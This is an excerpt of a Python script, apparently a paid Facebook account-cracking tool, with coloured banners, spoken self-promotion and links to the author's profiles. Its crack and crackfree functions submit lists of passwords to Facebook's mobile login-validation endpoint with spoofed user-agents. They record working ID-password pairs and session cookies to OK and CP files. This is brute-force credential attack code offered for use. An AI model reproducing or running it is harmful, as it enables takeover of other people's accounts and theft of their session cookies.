...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mUpdate Version 1.0😎...? ')
os.system('espeak -a 300 " Tools, Is, Paid, Free, User, Not, Allow"')
os.system('espeak -a 300 " Ridoy, Boss, Is, Always, King, Ok, Bro..."')
time.sleep(5)
os.system('clear')
os.system('espeak -a 600 " Join, My, Script, Gift, Group"')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100082048252987')
#------------------[ Ridoy ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mRidoy ]\33[1;38m        ║\033[1;31m 
╠══[Facebook                 • MAR-Ridoy ]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mRidoy ]   ║\33[1;34m   
╠══[Whatsapp                 • 01938532465 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  Ridoy,  King,  Tools"')
pass
...
def menu():
    ...
    if Ridoy in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801938532465')
        os.system("python nono.py")
    elif Ridoy in ['3','03']:
        result()
    elif Ridoy in ['0']:
...
def crack(idf,pwv):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[Ridoy-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Ridoy-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Ridoy-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ridoy, Ok, id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
